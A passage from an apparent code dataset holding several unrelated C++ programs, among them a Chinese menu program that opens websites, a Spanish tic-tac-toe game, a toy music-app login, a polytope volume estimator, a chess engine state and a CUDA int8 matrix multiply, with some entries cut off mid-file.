\"\u8bf7\u60a8\u81ea\u5df1\u590d\u5236\u7c98\u8d34\u60a8\u7684\u6587\u4ef6\uff0c\u6ce8\u610fQ\" << endl; \r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn ;\r\n}\r\nvoid downcpp(){\r\n\tputs(\"\u6765\u6765\u6765\uff0c\u4e0bc++\u8f7d\u6765\uff01\");\r\n\tSleep(2000);\r\n\tsystem(\"start https://www.onlinedown.net/soft/9500.htm\");\r\n\treturn ;\r\n}\r\nvoid chinajy(){\r\n\tputs(\"\u56fd\u5bb6\u4e91\u6559\u80b2\u5e73\u53f0\");\r\n\tSleep(2000);\r\n\tsystem(\"start https://basic.smartedu.cn/\");\r\n\treturn ;\r\n}\r\nvoid funnyth(){\r\n\tsystem(\"echo \u795e\u5947\u7684\u4e8b\u60c5\");\r\n\tSleep(2000);\r\n\tsystem(\"start https://lglg.top/61884\"); \r\n\treturn ;\r\n}\r\nvoid codeforces(){\r\n\tsystem(\"echo CODEFORCES----\u767e\u4e07\u7f16\u7a0b\u4eba\u58eb\u7684\u4fe1\u8d56\");\r\n\tsystem(\"start https://codeforces.com/\") ;\r\n\tre",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int TAMANO = 3;\r\nchar tablero[TAMANO][TAMANO] = { {'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'} };\r\n\r\nvoid mostrarTablero() {\r\n    cout << \"-------------\" << endl;\r\n    for (int i = 0; i < TAMANO; ++i) {\r\n        cout << \"| \";\r\n        for (int j = 0; j < TAMANO; ++j) {\r\n            cout << tablero[i][j] << \" | \";\r\n        }\r\n        cout << endl << \"-------------\" << endl;\r\n    }\r\n}\r\n\r\nbool esMovimientoValido(int movimiento) {\r\n    int fila = (movimiento - 1) / TAMANO;\r\n    int columna = (movimiento - 1) % TAMANO;\r\n    return movimiento >= 1 && movimiento <= 9 && tablero[fila][columna] != 'X' && tablero[fila][columna] != 'O';\r\n}\r\n\r\nvoid realizarMovimiento(char jugador, int movimiento) {\r\n    int fila = (movimiento - 1) / TAMANO;\r\n    int columna = (movimiento - 1) % TAMANO;\r\n    tablero[fila][columna] = jugador;\r\n}\r\n\r\nbool verificarVictoria(char jugador) {\r\n    // Verificar filas y columnas\r\n    for (int i = 0; i < TAMANO; ++i) {\r\n        if ((tablero[i][0] == jugador && tablero[i][1] == jugador && tablero[i][2] == jugador) ||\r\n            (tablero[0][i] == jugador && tablero[1][i] == jugador && tablero[2][i] == jugador)) {\r\n            return true;\r\n        }\r\n    }\r\n    // Verificar diagonales\r\n    if ((tablero[0][0] == jugador && tablero[1][1] == jugador && tablero[2][2] == jugador) ||\r\n        (tablero[0][2] == jugador && tablero[1][1] == jugador && tablero[2][0] == jugador)) {\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nbool verificarEmpate() {\r\n    for (int i = 0; i < TAMANO; ++i) {\r\n        for (int j = 0; j < TAMANO; ++j) {\r\n            if (tablero[i][j] != 'X' && tablero[i][j] != 'O') {\r\n                return false;\r\n            }\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    char jugadorActual = 'X';\r\n    bool juegoGanado = false;\r\n    bool juegoEmpatado = false;\r\n    int movimiento;\r\n\r\n    while (!juegoGanado && !juegoEmpatado) {\r\n        mostrarTablero();\r\n        cout << \"Jugador \" << jugadorActual << \", ingresa tu movimiento (1-9): \";\r\n        cin >> movimiento;\r\n\r\n        if (esMovimientoValido(movimiento)) {\r\n            realizarMovimiento(jugadorActual, movimiento);\r\n            juegoGanado = verificarVictoria(jugadorActual);\r\n            if (!juegoGanado) {\r\n                juegoEmpatado = verificarEmpate();\r\n                jugadorActual = (jugadorActual == 'X') ? 'O' : 'X';\r\n            }\r\n        } else {\r\n            cout << \"Movimiento inv\u00e1lido. Int\u00e9ntalo de nuevo.\" << endl;\r\n        }\r\n    }\r\n\r\n    mostrarTablero();\r\n\r\n    if (juegoGanado) {\r\n        cout << \"\u00a1Jugador \" << jugadorActual << \" gana!\" << endl;\r\n    } else if (juegoEmpatado) {\r\n        cout << \"\u00a1Es un empate!\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main() {\n\tstring baris;\n\tstring NamaFile;\n\n\tcout << \"Masukan Nama File : \";\n\tcin >> NamaFile;\n\n\t//membuka file dalam mode menulis\n\tofstream outfile;\n\t//menunjuk ke sebuah nama file\n\toutfile.open(NamaFile + \".txt\", ios::out);\n\n\tcout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\t//unlimited loop untuk menulis\n\twhile (true) {\n\t\tcout << \"- \";\n\t\t//mendapatkan setiap karakter dalam satu baris\n\t\tgetline(cin, baris);\n\t\t//loop akan berhenti jikka anda memasukan karakter q\n\t\tif (baris == \"q\") break;\n\t\t//menulis dan memasukkan nilai dari 'baris' ke dalam file\n\t\toutfile << baris << endl;\n\t}\n\t//selesai dalam menulis sekarang tutup filenya\n\toutfile.close();\n\n\n\t//membuka file dalam mode membaca\n\tifstream infile;\n\n\t//menunjuk ke sebuah file\n\tinfile.open(NamaFile + \".txt\", ios::in);\n\n\tcout << endl << \">= Membuka dan membaca file \" << endl;\n\t//jika file tidak ada maka\n\tif (infile.is_open())\n\t{\n\t\t//melakukan perulangan setiap baris\n\t\twhile (getline(infile, baris))\n\t\t{\n\t\t\t//dan tampilkan di sini\n\t\t\tcout << baris << '\\n';\n\t\t}\n\t\t//tutup file tersebut setelah diisi\n\t\tinfile.close();\n\t}\n\t//jika tidak ditemukan file maka akan menampilkan ini\n\telse cout << \"Unable to open file\";\n\treturn 0;\n}",
    "#include \"app.h\"\r\n\r\nvoid display_initialPage()\r\n{\r\n    std::cout << \"Welcome to LowBudget Spotify!\" << std::endl;\r\n    std::cout << \"1.Login\" << std::endl;\r\n    std::cout << \"2.Sign Up\" << std::endl;\r\n    std::cout << \"3.Exit\" << std:: endl;\r\n}\r\n\r\nvoid signUpProcess()\r\n{\r\n    //system(\"CLS\");\r\n    std::cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n    std::string userName, userSurname;\r\n\r\n    std::cout << \"Please type your name: \" << std::endl;\r\n    std::cin >> userName;\r\n\r\n    std::cout << \"Please type your surname: \" << std::endl;\r\n    std::cin >> userSurname;\r\n\r\n    createUser(userName, userSurname);\r\n}\r\n\r\nvoid loginProcess()\r\n{\r\n    int answer;\r\n    int goBack;\r\n    int position;\r\n    int userExists;\r\n    int log;\r\n    std::string userName, userSurname;\r\n\r\n    while(true)\r\n    {\r\n        //system(\"CLS\");\r\n        std::cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n\r\n        std::cout << \"Please type your name\\n->\";\r\n        std::cin >> userName;\r\n\r\n        std::cout << \"Please type your surname\\n->\";\r\n        std::cin >> userSurname;\r\n\r\n        userExists = searchUser(userName, userSurname);\r\n\r\n        if (userExists)\r\n        {\r\n            goBack = 0;\r\n            break;\r\n        }\r\n        else\r\n        {\r\n            std::cout << \"There is no user called '\" << userName << ' ' << userSurname << \"'!\" << std::endl;\r\n            std::cout << \"Would you like to try again?\";\r\n            std::cout << \"Type '1' if yes, else type '2'.\" << std::endl;\r\n\r\n            answer = userInput();\r\n\r\n            while (answer != 1 && answer != 2) {\r\n                std::cout << \"Please provide a valid input!\" << std::endl;\r\n                answer = userInput();\r\n            }\r\n\r\n            if(answer == 2)\r\n            {\r\n                goBack = 1;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    if(!(goBack))\r\n    {\r\n        position = userExists;\r\n        std::string password;\r\n\r\n        while(true) {\r\n            std::cout << \"Please type your password\\n->\";\r\n            std::cin >> password;\r\n\r\n            int cnt = 1;\r\n\r\n            std::list<User>::iterator temp = globalUserList.begin();\r\n\r\n            while (cnt < position) {\r\n                cnt++;\r\n                ++temp;\r\n            }\r\n\r\n            if (password == temp->password) {\r\n                log = 1;\r\n                break;\r\n            } else {\r\n                std::cout << std::endl << \"Incorrect password!\" << std::endl;\r\n                std::cout << \"Do you want to try again?\" << std::endl;\r\n                std::cout << \"Type '1' if yes, else type '2'.\" << std::endl;\r\n\r\n                answer = userInput();\r\n\r\n                while (answer != 1 && answer != 2) {\r\n                    std::cout << \"Please provide a valid input!\" << std::endl;\r\n                    answer = userInput();\r\n                }\r\n\r\n                if (answer == 2) {\r\n                    log = 0;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n\r\n        if(log == 1)\r\n        {\r\n            //system(\"CLS\");\r\n            std::cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n            display_mainMenu(userName, userSurname);\r\n        }\r\n        else\r\n        {\r\n            //system(\"CLS\");\r\n            std::cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n            display_initialPage();\r\n        }\r\n    }\r\n    else\r\n    {\r\n        //system(\"CLS\");\r\n        std::cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n        display_initialPage();\r\n    }\r\n}\r\n\r\nvoid display_mainMenu(const std::string& name, const std::string& surname)\r\n{\r\n    std::cout << \"Welcome \" << surname << \"!\" << std::endl;\r\n    std::cout << \"1.Create playlist\" << std::endl;\r\n    std::cout << \"2.Search playlist\" << std::endl;\r\n    std::cout << \"3.Search song\" << std::endl;\r\n    std::cout << \"4.Search artist\" << std::endl;\r\n    std::cout << \"5.Upload song\" << std::endl;\r\n    std::cout << \"6.Exit\" << std::endl;\r\n    std::cout << \"Please choose one of the options from above\" << std::endl;\r\n\r\n    int input = userInput();\r\n\r\n    while(input != 1 && input != 2 && input != 3 && input != 4 && input != 5 && input != 6)\r\n    {\r\n        std::cout << \"Please provide a valid input!\" << std::endl;\r\n        input = userInput();\r\n    }\r\n\r\n    if(input == 1)\r\n        createPlaylist(name, surname);\r\n    else if(input == 2)\r\n        searchPlaylist(name, surname);\r\n    else if(input == 3)\r\n        searchSong(name, surname);\r\n    else if(input == 4)\r\n        searchArtist(name, surname);\r\n    else if(input == 5)\r\n        uploadSong(name, surname);\r\n    else\r\n        exitProcess();\r\n\r\n}\r\n\r\nvoid exitProcess()\r\n{\r\n    //system(\"CLS\");\r\n    std::cout << \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n    std::cout << \"We hope we will see you soon! Goodbye!\";\r\n    std::this_thread::sleep_for(std::chrono::seconds(3));\r\n    exit(0);\r\n}",
    "/*\n  HaxoNotes.cpp - Read the Haxophone key matrix, convert it to\n  a bit-packed representation, and map it to a usable MIDI note.\n*/\n\n#include <Wire.h>\n#include \"HaxoNotes.h\"\n\nHaxoNotes::HaxoNotes() {}\n\nvoid HaxoNotes::init() {\n  // Initialize all pins\n  for (int i = 0; i < _NUM_COLS; i++) {\n      pinMode(_COLS[i], INPUT_PULLUP);\n  }\n  for (int i = 0; i < _NUM_ROWS; i++) {\n      pinMode(_ROWS[i], OUTPUT);\n      digitalWrite(_ROWS[i], HIGH);\n  }\n}\n\nuint8_t HaxoNotes::getMidiNote() {\n    uint32_t key = _scanKeys();\n    \n    // Yes, I know the linear search is O(N) and is terribly inefficient...\n    // ... but it was the lazy first pass, and it seems to be quick enough!\n    for (int i = 0; i < _NOTE_MAP_SIZE; i++) {\n        if (_NOTE_MAP[i].key == key) {\n            return _NOTE_MAP[i].note;\n        }\n    }\n    return 0;\n}\n\nuint32_t HaxoNotes::_scanKeys() {\n  uint32_t key_value = 0;\n    for (int row = 0; row < _NUM_ROWS; row++) {\n        digitalWrite(_ROWS[row], LOW);\n        delayMicroseconds(10);\n        for (int col = 0; col < _NUM_COLS; col++) {\n            if (digitalRead(_COLS[col]) == LOW) {\n                key_value |= (1 << (row * _NUM_COLS + col));\n            }\n        }\n        digitalWrite(_ROWS[row], HIGH);\n    }\n    return key_value;\n}\n",
    "#include \"polytope.h\"\n#include \"XoshiroCpp.hpp\"\n#include <cassert>\n#include <algorithm>\n\n#define M m\n#define N n\n\n// Specifies how many data types (float or double) fit into one vector register\nconst size_t N_VEC = 8;\nfloat* bound;\n#define align_pad(sz) (((sz)*sizeof(float))/32 + 1)*32\nfloat* A_arr;\n\nstatic inline\n// Takes a vector, and computes the sum of the individual elements of the vector.\nconst float vec_hadd(const __m256& v) {\n    __m128 hiQuad = _mm256_extractf128_ps(v, 1);\n    __m128 loQuad = _mm256_castps256_ps128(v);\n    __m128 sumQuad = _mm_add_ps(loQuad, hiQuad);\n\n    __m128 loDual = sumQuad;\n    __m128 hiDual = _mm_movehl_ps(sumQuad, sumQuad);\n    __m128 sumDual = _mm_add_ps(loDual, hiDual);\n\n    __m128 lo = sumDual;\n    __m128 hi = _mm_shuffle_ps(sumDual, sumDual, 0x1);\n    __m128 sum = _mm_add_ss(lo, hi);\n\n    return _mm_cvtss_f32(sum); \n}\n// Takes a vector, and computes the maximum of the individual elements of the vector.\nstatic inline\nconst float vec_hmax(const __m256& v) {\n    __m128 hiQuad = _mm256_extractf128_ps(v, 1);\n    __m128 loQuad = _mm256_castps256_ps128(v);\n    __m128 maxQuad = _mm_max_ps(loQuad, hiQuad);\n\n    __m128 loDual = maxQuad;\n    __m128 hiDual = _mm_movehl_ps(maxQuad, maxQuad);\n    __m128 maxDual = _mm_max_ps(loDual, hiDual);\n\n    __m128 lo = maxDual;\n    __m128 hi = _mm_shuffle_ps(maxDual, maxDual, 0x1);\n    __m128 max = _mm_max_ss(lo, hi);\n\n    return _mm_cvtss_f32(max); \n}\n// Takes a vector, and computes the minimum of the individual elements of the vector.\nstatic inline\nconst float vec_hmin(const __m256& v) {\n    __m128 hiQuad = _mm256_extractf128_ps(v, 1);\n    __m128 loQuad = _mm256_castps256_ps128(v);\n    __m128 minQuad = _mm_min_ps(loQuad, hiQuad);\n\n    __m128 loDual = minQuad;\n    __m128 hiDual = _mm_movehl_ps(minQuad, minQuad);\n    __m128 minDual = _mm_min_ps(loDual, hiDual);\n\n    __m128 lo = minDual;\n    __m128 hi = _mm_shuffle_ps(minDual, minDual, 0x1);\n    __m128 min = _mm_min_ss(lo, hi);\n\n    return _mm_cvtss_f32(min); \n}\n\nstatic const double unitBallVol(size_t n)\n{\n  // Added a DP-Like structure, avoid function calls.\n  double vol[n + 1];\n\n  vol[0] = 1;\n  vol[1] = 2;\n  double scale = (2 * M_PI);\n  for (size_t i = 2; i < n + 1; i++)\n  {\n    vol[i] = (scale / i) * vol[i - 2];\n  }\n  return vol[n];\n}\n\nconst void polytope::walk(float* norm, float* x, float *Ax, const float* B, const float* A_negrecp, const __m256* Agt,  const __m256* Alt, const float rk, XoshiroCpp::Xoshiro128PlusPlus &rng) const\n{\n  // Choose coordinate direction\n  int dir = (rng() % N);\n\n  float r, max, min, C = 0;\n\n  C = *norm;\n  C -= x[dir] * x[dir];\n\n  r = sqrt(rk - C);\n  max = r - x[dir], min = -r - x[dir];\n\n  float* A_dir = A_arr + M*dir;\n  // const double *A_negrecp_dir = A_negrecp + m * dir;\n  // A_negrecp.col(dir);\n  const float *B_ptr = B + M * dir, *A_negrecp_dir_ptr = A_negrecp + M*dir, *A_dir_ptr = A_dir;\n  float *bound_ptr = bound, *Ax_ptr = Ax;\n\n  __m256 max_all = _mm256_set1_ps(max), min_all = _mm256_set1_ps(min);\n  __m256 maxd = max_all, mind = min_all;\n  for (size_t i = 0, ii=0; i < (M / N_VEC) * N_VEC; i += N_VEC, ii+=1){\n    __m256 A_negrecp_dir_vec = _mm256_loadu_ps(A_negrecp_dir_ptr + i);\n    __m256 Ax_vec = _mm256_load_ps(Ax_ptr + i);\n    __m256 B_vec = _mm256_loadu_ps(B_ptr + i);\n    __m256 Agt_curr = Agt[(M/N_VEC)*dir + ii];\n    __m256 Alt_curr = Alt[(M/N_VEC)*dir + ii];\n    __m256 bb = _mm256_fmadd_ps(Ax_vec, A_negrecp_dir_vec, B_vec);    \n    __m256 bbgt = _mm256_blendv_ps(max_all, bb, Agt_curr);\n    maxd = _mm256_min_ps(maxd, bbgt);\n    __m256 bblt = _mm256_blendv_ps(min_all, bb, Alt_curr);\n    mind = _mm256_max_ps(mind, bblt);\n  }\n  min = vec_hmax(mind), max = vec_hmin(maxd);\n  for (size_t i = (M / N_VEC) * N_VEC ; i < M; i++)\n  {\n    float aa = A_dir[i];\n    float bb = B[M * dir + i] + (Ax[i] * A_negrecp_dir_ptr[i]);\n    if (aa > 0 && bb < max)\n      max = bb;\n    else if (aa < 0 && bb > min)\n      min = bb;\n  }\n\n  float randval = (XoshiroCpp::FloatFromBits(rng()))*(max - min) + min;\n  float t = x[dir] + randval;\n  x[dir] = t;\n  // assert((min - 0.00001) <= randval && randval <= (max + 0.00001));\n  \n  __m256 randval_vec = _mm256_set1_ps(randval); \n  for (size_t i = 0; i < (M / N_VEC) * N_VEC; i += N_VEC){\n    __m256 Ax_vec = _mm256_load_ps(Ax_ptr + i);\n    __m256 A_dir_vec = _mm256_loadu_ps(A_dir_ptr + i);\n    __m256 result = _mm256_fmadd_ps(randval_vec, A_dir_vec, Ax_vec);\n    _mm256_store_ps(Ax_ptr + i, result);\n  }\n  // Cleanup code\n  for (size_t i = (M / N_VEC) * N_VEC; i < M; i++){\n    Ax[i] += A_dir[i] * randval;\n  }\n  *norm = C + t * t;\n}\n\nconst double polytope::estimateVol() const\n{\n  // Re Declaring it Here -- Also no need to initialize Alpha Array\n  double res = gamma;\n  // Moved this from the bottom, got rid of the alpha array - avoid memory accesses full\n  \n  long l = ceill(N * log2(2 * N));\n  long step_sz = 1600 * l;\n  long count = 0;\n  float* x = (float *) aligned_alloc(32, align_pad(N));\n  memset((void *)x,0,align_pad(N));\n  // long t[l + 1];\n  flo",
    "#include \"pch.h\"\r\n\r\n#include \"search.h\"\r\n\r\nstruct Chess {};\r\n\r\nenum Player : uint8_t {\r\n  White = 0,\r\n  Black,\r\n  PlayerCount\r\n};\r\n\r\nenum Piece : uint8_t {\r\n  ___ = 0,\r\n\r\n  W_P,\r\n  W_N,\r\n  W_B,\r\n  W_R,\r\n  W_Q,\r\n  W_K,\r\n\r\n  B_P,\r\n  B_N,\r\n  B_B,\r\n  B_R,\r\n  B_Q,\r\n  B_K,\r\n\r\n  W_FIRST = W_P,\r\n  W_LAST = W_K,\r\n\r\n  B_FIRST = B_P,\r\n  B_LAST = B_K,\r\n};\r\n\r\nenum Space {\r\n  A1,\r\n  A2,\r\n  A3,\r\n  A4,\r\n  A5,\r\n  A6,\r\n  A7,\r\n  A8,\r\n\r\n  B1,\r\n  B2,\r\n  B3,\r\n  B4,\r\n  B5,\r\n  B6,\r\n  B7,\r\n  B8,\r\n\r\n  C1,\r\n  C2,\r\n  C3,\r\n  C4,\r\n  C5,\r\n  C6,\r\n  C7,\r\n  C8,\r\n\r\n  D1,\r\n  D2,\r\n  D3,\r\n  D4,\r\n  D5,\r\n  D6,\r\n  D7,\r\n  D8,\r\n\r\n  E1,\r\n  E2,\r\n  E3,\r\n  E4,\r\n  E5,\r\n  E6,\r\n  E7,\r\n  E8,\r\n\r\n  F1,\r\n  F2,\r\n  F3,\r\n  F4,\r\n  F5,\r\n  F6,\r\n  F7,\r\n  F8,\r\n\r\n  G1,\r\n  G2,\r\n  G3,\r\n  G4,\r\n  G5,\r\n  G6,\r\n  G7,\r\n  G8,\r\n\r\n  H1,\r\n  H2,\r\n  H3,\r\n  H4,\r\n  H5,\r\n  H6,\r\n  H7,\r\n  H8,\r\n\r\n  SpaceCount\r\n};\r\n\r\nstruct Coord {\r\n  Coord(Space par_space) : c(par_space / 8), r(par_space % 8) {}\r\n  Coord(int8_t par_c, int8_t par_r) : c(par_c), r(par_r) {}\r\n\r\n  int8_t c, r;\r\n\r\n  operator Space () const { return Space(8*c + r ); }\r\n};\r\n\r\nvoid ForEachSpace(std::function<void(Space)> par_function) {\r\n  for (int i = 0; i < SpaceCount; ++i)\r\n    par_function(Space(i));\r\n}\r\n\r\nPlayer ToPlayer(Piece par_piece) {\r\n  assert(par_piece != ___);\r\n\r\n  return (par_piece <= W_LAST) ? White : Black;\r\n}\r\n\r\ntemplate <>\r\nstruct Action<Chess> {\r\n  Action() { *this = Checkmate; }\r\n  Action(Space par_orig, Space par_dest, Piece par_promotion = ___)\r\n    : orig(par_orig), dest(par_dest), promotion(par_promotion) {}\r\n\r\n  bool operator==(const Action<Chess>& par_rhs) const {\r\n    return orig == par_rhs.orig && dest == par_rhs.dest && promotion == par_rhs.promotion;\r\n  }\r\n\r\n  Space orig, dest;\r\n  Piece promotion;\r\n\r\n  static const Action Checkmate;\r\n};\r\n\r\nconst Action<Chess> Action<Chess>::Checkmate = { A1, A1, ___ };\r\n\r\ntemplate <> struct State<Chess> {\r\n  State() {\r\n    board = { ___ };\r\n    board[A2] = board[B2] = board[C2] = board[D2] = board[E2] = board[F2] = board[G2] = board[H2] = W_P;\r\n    board[B1] = board[G1] = W_N;\r\n    board[C1] = board[F1] = W_B;\r\n    board[A1] = board[H1] = W_R;\r\n    board[D1] = W_Q;\r\n    board[E1] = W_K;\r\n\r\n    board[A7] = board[B7] = board[C7] = board[D7] = board[E7] = board[F7] = board[G7] = board[H7] = B_P;\r\n    board[B8] = board[G8] = B_N;\r\n    board[C8] = board[F8] = B_B;\r\n    board[A8] = board[H8] = B_R;\r\n    board[D8] = B_Q;\r\n    board[E8] = B_K;\r\n\r\n    king_space = { E1, E8 };\r\n    king_moved = { false, false };\r\n    rookA_moved = { false, false };\r\n    rookH_moved = { false, false };\r\n    check = false;\r\n  }\r\n\r\n  State& operator=(const State& par_state) {\r\n    board = par_state.board;\r\n    moves = par_state.moves;\r\n    king_space = par_state.king_space;\r\n    king_moved = par_state.king_moved;\r\n    rookA_moved = par_state.rookA_moved;\r\n    rookH_moved = par_state.rookH_moved;\r\n    check = false;\r\n\r\n    return *this;\r\n  }\r\n\r\n  std::array<Piece, SpaceCount> board;\r\n  std::vector<Action<Chess>> moves;\r\n  std::array<Space, PlayerCount> king_space;\r\n  std::array<bool, PlayerCount> king_moved;\r\n  std::array<bool, PlayerCount> rookA_moved;\r\n  std::array<bool, PlayerCount> rookH_moved;\r\n  bool check;\r\n};\r\n\r\ntemplate <>\r\nstruct PathCost<Chess> {\r\n  PathCost() {\r\n    piece_weight = 1.f;\r\n    child_count = 0;\r\n    min_child_cost = 0.f;\r\n    expanded = false;\r\n  }\r\n  PathCost(const State<Chess>& par_state) {\r\n    const Player player = Player(par_state.moves.size() % 2);\r\n    float w_pieces = 0.f;\r\n    float b_pieces = 0.f;\r\n\r\n    for (Piece piece : par_state.board) {\r\n      switch (piece) {\r\n      case W_P:\r\n        w_pieces += 1;\r\n        break;\r\n\r\n      case W_N:\r\n        w_pieces += 2;\r\n        break;\r\n\r\n      case W_B:\r\n        w_pieces += 3;\r\n        break;\r\n\r\n      case W_R:\r\n        w_pieces += 5;\r\n        break;\r\n\r\n      case W_Q:\r\n        w_pieces += 9;\r\n        break;\r\n\r\n      case B_P:\r\n        b_pieces += 1;\r\n        break;\r\n\r\n      case B_N:\r\n        b_pieces += 2;\r\n        break;\r\n\r\n      case B_B:\r\n        b_pieces += 3;\r\n        break;\r\n\r\n      case B_R:\r\n        b_pieces += 5;\r\n        break;\r\n\r\n      case B_Q:\r\n        b_pieces += 9;\r\n        break;\r\n\r\n      default:\r\n        break;\r\n      }\r\n    }\r\n\r\n    piece_weight = player == White ? (w_pieces / b_pieces) : (b_pieces / w_pieces);\r\n    child_count = 0;\r\n    min_child_cost = 0.f;\r\n    expanded = false;\r\n  }\r\n\r\n  operator float () const {\r\n    if (not expanded)\r\n      return piece_weight;\r\n\r\n    if (child_count == 0)\r\n      return 0;\r\n\r\n    return 1.f / min_child_cost;\r\n  }\r\n\r\n  float piece_weight = 1.f;\r\n  size_t child_count = 0;\r\n  float min_child_cost = 0.f;\r\n  bool expanded = false;\r\n};\r\n\r\nvoid ForEachSpaceHorizontalAndVertical(const std::function<void(Space)>& par_function, const std::array<Piece, SpaceCount>& par_board, Space par_space) {\r\n  const Coord coord(par_space);\r\n\r\n  for (int8_t h = -1; h <= 1; h += 1) {\r\n    for (int8_t v = -1; v <= 1; v += 1) {\r\n      if (std::abs(h) + std::abs(v) != 1)\r\n        continu",
    "#include <utility>\n#include <cublasLt.h>\n#include <cuda_runtime.h>\n#include <iostream>\n#include <ATen/cuda/CUDAContext.h>\n#include <ATen/cuda/Exceptions.h>\n#include <torch/extension.h>\n\n// cuBLAS error checking\nvoid cublasCheck(cublasStatus_t status, const char *file, int line)\n{\n    if (status != CUBLAS_STATUS_SUCCESS)\n    {\n        printf(\"[cuBLAS ERROR]: %d %s %d\\n\", status, file, line);\n        exit(EXIT_FAILURE);\n    }\n}\n#define cublasCheck(status)                        \\\n    {                                              \\\n        cublasCheck((status), __FILE__, __LINE__); \\\n    }\n\ntorch::Tensor int8_matmul_cublaslt(torch::Tensor a, torch::Tensor b)\n{\n    a = a.contiguous();\n    b = b.contiguous();\n\n    cublasLtHandle_t handle = reinterpret_cast<cublasLtHandle_t>(\n        at::cuda::getCurrentCUDABlasHandle());\n\n    auto options = torch::TensorOptions().dtype(torch::kInt32).device(a.device());\n    auto c = torch::zeros({a.size(0), b.size(1)}, options);\n\n    cublasLtMatrixLayout_t layoutA, layoutB, layoutC;\n    cublasCheck(cublasLtMatrixLayoutCreate(&layoutA, CUDA_R_8I, a.size(1), a.size(0), a.size(1)));\n    cublasCheck(cublasLtMatrixLayoutCreate(&layoutB, CUDA_R_8I, b.size(1), b.size(0), b.size(1)));\n    cublasCheck(cublasLtMatrixLayoutCreate(&layoutC, CUDA_R_32I, b.size(1), a.size(0), b.size(1)));\n\n    cublasLtMatmulDesc_t operationDesc;\n    cublasCheck(cublasLtMatmulDescCreate(&operationDesc, CUBLAS_COMPUTE_32I, CUDA_R_32I));\n\n    int8_t *a_data = (int8_t *)a.data_ptr();\n    int8_t *b_data = (int8_t *)b.data_ptr();\n    int32_t *c_data = (int32_t *)c.data_ptr();\n\n    float alpha = 1.0f, beta = 0.0f;\n    cublasCheck(cublasLtMatmul(\n        handle,\n        operationDesc,\n        &alpha,\n        b_data, layoutB, // a and b swapped\n        a_data, layoutA,\n        &beta,\n        c_data, layoutC,\n        c_data, layoutC,\n        nullptr,\n        nullptr, 0, 0));\n\n    cublasCheck(cublasLtMatrixLayoutDestroy(layoutA));\n    cublasCheck(cublasLtMatrixLayoutDestroy(layoutB));\n    cublasCheck(cublasLtMatrixLayoutDestroy(layoutC));\n    cublasCheck(cublasLtMatmulDescDestroy(operationDesc));\n    cublasCheck(cublasLtDestroy(handle));\n\n    return c;\n}\n\nPYBIND11_MODULE(TORCH_EXTENSION_NAME, m)\n{\n    m.def(\"matmul_int8\", &int8_matmul_cublaslt, \"int8 multiply\");\n}\n",
    "#include \"worldpartition.h\"\n#include <..\\godot-cpp-4.2\\include\\godot_cpp\\core\\class_db.hpp>\n#include <..\\godot-cpp-4.2\\gen\\include\\godot_cpp\\variant\\utility_functions.hpp>\n#include <..\\godot-cpp-4.2\\gen\\include\\godot_cpp\\classes\\node3d.hpp>\n#include <..\\godot-cpp-4.2\\include\\godot_cpp\\core\\object.hpp>\n\nusing namespace godot;\n\nvoid WorldPartition::_bind_methods() {\n    ClassDB::bind_method(D_METHOD(\"get_chunk_size\"), &WorldPartition::get_chunk_size);\n    ClassDB::bind_method(D_METHOD(\"set_chunk_size\", \"p_chunk_size\"), &WorldPartition::set_chunk_size);\n    ClassDB::add_property(\"WorldPartition\", PropertyInfo(Variant::VECTOR3, \"chunk_size\"), \"set_chunk_size\", \"get_chunk_size\");\n\n    ClassDB::bind_method(D_METHOD(\"get_map_size\"), &WorldPartition::get_map_size);\n    ClassDB::bind_method(D_METHOD(\"set_map_size\", \"p_map_size\"), &WorldPartition::set_map_size);\n    ClassDB::add_property(\"WorldPartition\", PropertyInfo(Variant::VECTOR3, \"map_size\"), \"set_map_size\", \"get_map_size\");\n\n    ClassDB::bind_method(D_METHOD(\"get_show_chunk_markers\"), &WorldPartition::get_show_chunk_markers);\n    ClassDB::bind_method(D_METHOD(\"set_show_chunk_markers\", \"p_show_chunk_markers\"), &WorldPartition::set_show_chunk_markers);\n    ClassDB::add_property(\"WorldPartition\", PropertyInfo(Variant::BOOL, \"show_chunk_markers\"), \"set_show_chunk_markers\", \"get_show_chunk_markers\");\n\n    ClassDB::bind_method(D_METHOD(\"get_auto_mapsize\"), &WorldPartition::get_auto_mapsize);\n    ClassDB::bind_method(D_METHOD(\"set_auto_mapsize\", \"p_use_auto_mapsize\"), &WorldPartition::set_auto_mapsize);\n    ClassDB::add_property(\"WorldPartition\", PropertyInfo(Variant::BOOL, \"use_auto_mapsize\"), \"set_auto_mapsize\", \"get_auto_mapsize\");\n}\n\nWorldPartition::WorldPartition() {\n    chunk_size = Vector3(0.0, 0.0, 0.0);\n    map_size = Vector3(0.0, 0.0, 0.0);\n    show_chunk_markers = false;\n}\n\nWorldPartition::~WorldPartition() {}\n\nvoid WorldPartition::_process(double delta) {\n    \n}\n\nvoid WorldPartition::_ready() {\n    marker_thickness = 0.2;\n    children_nodes = get_children();\n    int non_node3d_count = 0;\n    number_of_columns = map_size.x / chunk_size.x;\n    number_of_rows = map_size.z / chunk_size.z;\n    godot::StringName test_name = \"Player\";\n    for (int i = 0; i < children_nodes.size(); i++)\n    {\n        godot::Node3D* child = Object::cast_to<Node3D>(children_nodes[i]);\n        if (child && child->get_name() != test_name) {\n            